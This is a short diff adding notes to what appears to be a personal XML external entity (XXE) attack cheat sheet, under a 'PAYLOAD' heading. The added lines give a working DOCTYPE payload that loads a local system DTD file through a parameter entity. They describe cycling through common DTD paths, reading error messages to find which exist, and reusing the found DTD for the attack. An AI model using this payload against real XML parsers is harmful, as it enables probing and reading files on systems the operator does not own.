@@ -51,3 +51,13 @@ eg.
 ]>
 
 -----------------------PAYLOAD--------------------
+
+locating a DTD file:
+
+<!DOCTYPE foo [
+<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
+%local_dtd;
+]>
+
+ we can cycle through a list of common dtd file present in a system and enumerate thriugh error messages to know about it
+once we know which dtd is present we ca review the dtd as it is open source and use it as we want
